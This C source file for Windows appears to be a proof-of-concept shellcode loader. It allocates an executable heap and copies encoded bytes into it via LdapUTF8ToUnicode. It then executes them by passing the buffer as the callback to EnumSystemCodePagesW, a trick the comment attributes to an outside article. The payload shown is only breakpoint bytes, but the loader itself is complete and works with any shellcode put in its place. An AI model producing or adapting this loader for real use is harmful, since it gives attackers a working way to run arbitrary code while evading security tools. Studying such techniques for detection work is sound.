#include <Windows.h>
#include <Winldap.h>

#pragma comment(lib, "wldap32.lib")

int main(int argc, char** argv) {
	LPCSTR orig_shellcode = "\xec\xb3\x8c\xec\xb3\x8c"; // \xcc\xcc\xcc\xcc in UNICODE
	LPWSTR copied_shellcode = NULL;
	HANDLE heap = NULL;
	int ret = 0;
	int size = 0;
	
	heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
	copied_shellcode = HeapAlloc(heap, 0, 0x10);
	size = LdapUTF8ToUnicode(orig_shellcode, strlen(orig_shellcode), NULL, 0); // First call is to know the size
	ret = LdapUTF8ToUnicode(orig_shellcode, strlen(orig_shellcode), copied_shellcode, size);
	EnumSystemCodePagesW(copied_shellcode, 0); // Just to trigger the execution. Taken from Nootrak article.
	return 0;
}
